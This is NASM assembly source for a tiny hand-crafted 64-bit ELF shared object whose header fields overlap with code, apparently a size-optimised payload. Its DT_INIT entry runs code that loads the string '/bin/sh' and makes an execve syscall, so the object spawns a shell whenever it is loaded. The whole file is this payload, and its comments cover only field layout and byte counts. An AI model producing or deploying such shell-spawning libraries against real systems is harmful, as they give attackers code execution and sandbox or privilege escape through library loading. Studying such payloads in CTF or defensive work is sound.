BITS 64

ehdr:                               ; Elf64_Ehdr
        db  0x7f, "ELF", 2, 1, 1, 0 ; e_ident
times 8 db  0
        dw  3                       ; e_type
        dw  0x3e                    ; e_machine
        dd  1                       ; e_version
        dq  stage1                  ; e_entry
        dq  phdr - $$               ; e_phoff
stage1: ; 12 bytes
        mov rdi, 0x68732f6e69622f  ; 10 bytes
        jmp stage2  ; 2 bytes

        dw  ehdrsize                ; e_ehsize
        dw  phdrsize                ; e_phentsize
        dw  2                       ; e_phnum
ehdrsize  equ  $ - ehdr

phdr:                               ; Elf64_Phdr
        dd  1                       ; p_type
        dd  7                       ; p_flags
        dq  0                       ; p_offset
        dq  $$                      ; p_vaddr
stage2: ; 16 bytes
        xor rax, rax  ; 3
        push rdi  ; 1
        push rsp  ; 1
        pop rdi   ; 1
        push 0    ; 1
        push rdi  ; 1
        mov rsi, rsp  ; 3
        mov al, 59  ; 2
        syscall  ; 2

        dq  progsize                ; p_memsz
        dq  0x1000                  ; p_align
phdrsize  equ  $ - phdr
        dd  2                       ; p_type
        dd  7                       ; p_flags
        dq  dynamic                 ; p_offset
        dq  dynamic                 ; p_vaddr

dynamic:
  dt_init:
        dq  0xc, stage1
  dt_strtab:
        dq  0x5, stage1
  dt_symtab:
        dq  0x6, stage1
dynsize  equ  $ - dynamic

progsize  equ  $ - $$
